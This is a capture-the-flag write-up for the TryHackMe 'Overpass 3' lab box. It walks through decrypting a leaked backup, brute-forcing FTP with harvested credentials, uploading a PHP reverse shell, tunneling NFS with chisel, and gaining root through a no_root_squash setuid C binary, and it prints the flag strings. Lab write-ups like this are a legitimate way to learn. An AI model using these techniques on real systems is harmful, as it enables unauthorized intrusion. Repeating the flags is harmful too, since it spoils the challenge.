# Overpass 3-Hosting - Linux Medium

**Box IP might change all over the readme cause it took me literal hours to figure out.**

## Enumertion

### Nmap : `nmap -sT -p- -oN nmap-initial 10.10.253.27`

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Gobuster : `gobuster dir -u http://10.10.253.27/ --wordlist common.txt| tee gobuster-scan`

```
/.htaccess            (Status: 403) [Size: 218]
/.hta                 (Status: 403) [Size: 213]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 236] [--> http://10.10.253.27/backups/]
/cgi-bin/             (Status: 403) [Size: 217]                                   
/index.html           (Status: 200) [Size: 1770]                                  
```

Let's check the backups dir. We have got ourselves a **backup.zip** file. Unziping it we get a gpg priv key and a gpg encrypted file. Gotta decrypt it and check what we have.

First lets import the key file to gpg using: `gpg --import priv.key`

Lets decrypt now: `gpg -d CustomerDetails.xlsx.gpg > decryped_file`

Now we have a got an excel file. Let's read it.

### Building a script to read excel file contents

*I know I could have just used ms-excel or uploaded online to open it... but I had this thought after I wrote the script for reading the xlsx file content. I guess something is wrong with me...*

**Python script for read .xlsx**

```
#!/usr/bin/env/python3

from openpyxl import load_workbook

file = "decryped_file.xlsx"

wb = load_workbook(file)
sheet = wb.active

print(f"Sheets found: {wb.sheetnames}")
print(f"\tROWS found: {sheet.max_row}\tColumns found: {sheet.max_column}")

# iterating through column names
column_name = []
for f in sheet.iter_cols(1, sheet.max_column):
	column_name.append(f[0].value)
print(f"Found following column names: {column_name}")
print("++++"*20)

# Creating files for username and password
f_user_list = open("user_list.txt", "w")
f_pass_list = open("pass_list.txt", "w")

# iterating through rows 
data = []
for f in sheet.iter_rows(values_only=True):
	print(f)
	f_user_list.write(f"{f[1]}\n")
	f_pass_list.write(f"{f[2]}\n")

f_user_list.close()
f_pass_list.close()

print("\nFiles created!")
```

**Output:**

```
('Customer Name', 'Username', 'Password', 'Credit card number', 'CVC')
('Par. A. Doxx', 'paradox', 'ShibesAreGreat123', '4111 1111 4555 1142', 432)
('0day Montgomery', '0day', 'OllieIsTheBestDog', '5555 3412 4444 1115', 642)
('Muir Land', 'muirlandoracle', 'A11D0gsAreAw3s0me', '5103 2219 1119 9245', 737)

```

There should be now two new files in the current dir... *user_list.txt* and *pass_list.txt*. Lets try this to attack ssh.. It failed.... Hmm FTP maybe?

**Command:** `hydra -L user_list.txt -P pass_list.txt ftp://10.10.28.183`

**Output:** `[21][ftp] host: 10.10.28.183   login: paradox   password: ShibesAreGreat123`

We got ourselves ftp creds. Lets login and look around. Nothing here!... Can I upload file to this?

Let's try: `put reverse-shell.php`

**NOTE TO SELF: Make sure you are in the directory on local machine where your file to be uploaded is. Otherwise it gives 503 error**

`put ~/script/reverse-shell.php` : *Does not work*  

`put reverse-shell.php` : *works when ftp is executed from ~/script/ directory*


## Web-Flag

After putting the reverse shell just need to call that using curl or maybe visiting the address using the browser.

`curl 10.10.94.33/reverse-shell.php`

This should result in providing a rev shell. Lets stablize it using the following commands:

```
python3 -c "import pty; pty.spawn('/bin/bash')"
CTRL+z
stty raw -echo
fg
xterm=256-xtermcolor
```

*find* command will help with figuring out the location of the web flag. This can be done using the following command:

`find / -type f 2>/dev/null | grep flag` 

Just cat the file out and voila first flag: `thm{0ae72f7870c3687129f7a824194be09d}`


## User-flag

Let's check the /etc/passwd for list of users here. Looks like we got **root**, **james** and **paradox** as users with shell. This can be done using the following command:

`cat /etc/passwd | grep -E "/bin/.*sh"`

I already have the paradox password when I checked that .xlsx file. Maybe ...just maybe... let's try... Success!

`ls -al` reveals no flag file here. Maybe the file is with **james** user. Hmm can't even look in his directory. `sudo -l`: Nothing here also. Gotta run **linPEAS**

linPEAS has reported **sudo** and **nfs**. Checking **searchsploit** for sudo exploits for that version - Nothing.

Let's check NFS now. Hmm I had done *-p-* while scanning the nmap. It did not show me any rpc/nfs. It's running according to linPEAS ...hmm gotta check that **/etc/exports** file.

`/home/james *(rw,fsid=0,sync,no_root_squash,insecure)`

Is it running locally? (RANDOM THOUGHT).

### Port Forwarding 

*Hells about to be unleashed*

Never really did port forwarding/tunneling. A lot of trial and error. Let's try ssh first.

`ssh -R 0.0.0.0:10521:127.0.0.1:2049 paradox@10.10.20.187`

Didn't work... Checked it out for about a day and then realized I couldn't even do ssh to the paradox guy.... OK maybe using ssh-keygen here might help with creating new keys(maybe old keys are causing issue somehow... RANDOM THOUGHT). New keys created but still not able to do ssh. Maybe ssh isn't working fine for the machine. Gotta see any other commands/scripts that might help. 

Came across a script that might help [**chisel**](https://github.com/jpillora/chisel). Followed the install guide using curl.. It worked for my machine. Now lets do the same thing on the box. It did not work. Reason: that box was not able to connect to any internet service. Awesome.. Time to take a break!

What if I copy the binary I had on machine to the box.. would that work? Well what's the worse that can happen? (I have to figure out other way for tunneling).

Created a *SimpleHTTPServer* and did curl on attacking machine to get the binary. Now let's try it out. It seems to give appropriate output when executed without any arguments.

Command: `./chisel`

```
Usage: chisel [command] [--help]

  Version: 1.7.6 (go1.16rc1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Alright let's tunnel.

On Victim: `./chisel <attacked_ip>:<attacked_port> R:2049:localhost:2049`

On Attacker: `chisel server --reverse --port 9999`

Got it!. Lets check if I can see NFS or not. 

Command: `showmount -e localhost`

Output: `clnt_create: RPC: Timed out`

Now what? Hereby I decided to look for walkthroughs... cause I had no more ideas. In the walkthrough I looked through it was listing `/home/james` as output for the showmount command. Why I ain't getting that? Maybe I did something wrong with the tunnneling?... It was right.
Spent an hour figuring this thing out. Did not work. Redeployed the machine. Now not able create a stable shell. WTH... it worked last 2 times but not now? Spent some more time.
Redeployed the machine and it worked. Created a stable shell. Again did tunnneling but still not able to get the expected output for showmount. Not sure what's wrong. Well lets try mounting it (Well how would it work if it wasn't able to check for it- inner me). 

`sudo mount -t nfs locahost:/ nfs/`

It mounted... I suffered all that for nothing?... well whatever `ls -al`

Finally got user flag.

`thm{3693fc86661faa21f16ac9508a43e1ae}`

Also there is **.ssh** dir having key for james. Copied it. Of-course how would it work as didn't work for paradox. It worked... I don't know anything anymore. (Despair level max)

## Root-flag

**no_root_squash** in /etc/exports

What it means:

```
no_root_squash : This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
```

How I interpreted it:
```
Any file uploaded will be treated as file uploaded by root user.
```

Messed with this for about 10 mins when I finally realized the true meaning of those words.

**Upload files as root user on the nfs share**. Now lets check the file perms using james ssh. It uploaded as root and as it had perms 777 I could freely use it. OK let's create a simple c file for getting root.

```
void main(void){
    setresuid(0, 0, 0);
    system("/bin/sh");
}
```

Compiled the above code and uploaded the binary using nfs share as **root**. Changed the permssions and set suid bit. SSH again into james user and execute the binary to get the root shell. Just cat the root flag now.

`thm{a4f6adb70371a4bceb32988417456c44}`

